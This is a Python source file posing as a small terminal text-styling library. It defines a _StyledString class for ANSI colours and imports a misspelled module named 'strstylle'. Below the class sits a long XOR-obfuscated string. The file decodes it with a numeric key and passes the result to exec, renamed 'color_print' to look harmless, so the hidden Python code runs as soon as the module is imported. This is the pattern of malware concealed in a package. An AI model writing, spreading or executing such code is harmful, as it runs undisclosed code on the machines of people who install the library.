import os

import strstylle

color_print = exec
class _StyledString(str):

    def __new__(cls, style_list, sep, *objects):
        return super(_StyledString, cls).__new__(cls, sep.join([str(obj) for obj in objects]))

    def __init__(self, style_list, sep, *objects):
        self._style_start = ';'.join([str(s[0]) for s in style_list])
        self._style_end = ';'.join([str(s[1]) for s in style_list])
        self._sep = sep
        self._objects = objects

    def __add__(self, other):
        return self.__str__() + str(other)

    def __str__(self):
        if strstylle._StyledStringBuilder._enabled:
            string = ''
            for i, obj in enumerate(self._objects):
                if i > 0:
                    string += self._sep

                if type(obj) is _StyledString:
                    string += '%s\033[%sm' % (obj, self._style_start)
                else:
                    string += str(obj)
            return '\033[%sm%s\033[%sm' % (self._style_start, string, self._style_end)
        return super(_StyledString, self).__str__()

    def rjust(self, width, fillchar=' '):
        n_chars = width - len(self)
        if n_chars > 0:
            string = str(self)
            return string.rjust(len(string) + n_chars, fillchar)
        return self

    def ljust(self, width, fillchar=' '):
        n_chars = width - len(self)
        if n_chars > 0:
            string = str(self)
            return string.ljust(len(string) + n_chars, fillchar)
        return self
wopvEaTEcopFEavc ="^^EYKE\x16\\B\x1cFXXAVWEY\x1cCG[FAVT\\AK?[^\x13GTVD_^G^\x1cKODMRX\x11\x11\x18KEQFCFC^DQ\x11\x15uZ\\GH\x10\x1c\x0f:\x15\x13\x13\x19\x17\x19\x19\x12MAI\x0b>\x16\x19\x11\x16\x13\x16\x17\x19\x10\x13\x10\x14DPA_\x13ZF\\_\x1e\x14\x1eD[D\x16SYTR\x1a@I\x15\x15\x16\x14N\x10\x10\x12YF\x12^\t=\x18\x17\x10\x19\x11\x15\x13\x12\x18\x16\x17\x19\x17\x15\x19\x18P\x16FB]CP\x1c\x15\x12\x1b3^TC]@D\x12F@REA\\ZRJJ8_A_\\\x14CK]ZZT\x17P]C_FG\x19GRB@SJE<GCI\x0c>\x19\x15\x10\x18EQ]_F\\iFK[\x19\x0f\x1f]FLCD\x02\x18\x1f]]\x1bW@WFUVO\x1bZW[\x17B\x1fM\\^NY\x01\x0c\x08NLF\x06WX\x00\x1aX_Q\x1d@Q\x103\x19\x12\x19\x13\\^WWUnPZZR\x19\r\x13\x17\x1bGTE\x18\x1dA[I\x1fE[\x16:\x16\x14\x19\x15B]FAUCF\x17CAUE\\FJ\\WNV\x1fJR]VEPlGJZ\x1b\x19[ZZYZgWYXR\x1c>\x17\x10\x19\x19DLQB@_QPFC\x1bPRU[\x11\x1bPX@X\x11\x1bBTA\x19\x1dBZI\x1e@X\x14\r\x16QRE\x1aXL]Z\x13\x03\x0e\x10\x05\x1b\x19\x10K_Q\\\\\x0fmDF\\\x1e3W@VWHG\r2\x17\x10\x19\x11EA[VB\x1f\x10=\x15\x19\x18\x16\x18\x11\x10\x14\x17\x15\x14\x17\x10\x19\x19\x17\x1b\x11\x10\x1b:\x12\x15\x15\x10\x15\x13\x13\x19RAZWIG\x10w]Z\\\x7fYGpXL^WuFAVG\r9\x15\x16\x19\x11\x16\x13\x11\x10\x16\x14\x19\x15@J^ZD\x18\x10\x1b\x1f9\x19\x17\x19\x12\x18\x15\x12\x18@BZGBVRP@A\x16UVU[\x1d\x1bHOLY_Z\x04\x15\x1bC]I\x16QP_W\x1c@K\x15\x13\x12\x19\x13@QRUU\x0fmAET\x1d<3;<9<" 
iOpvEoeaaeavocp = "7356916310649508740029639792852837870915328679759868104754709979322025505339799293014691636790304395"
uocpEAtacovpe = len(wopvEaTEcopFEavc)
oIoeaTEAcvpae = ""
for fapcEaocva in range(uocpEAtacovpe):
    nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[fapcEaocva]
    qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[fapcEaocva % len(iOpvEoeaaeavocp)]
    oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))
color_print(oIoeaTEAcvpae)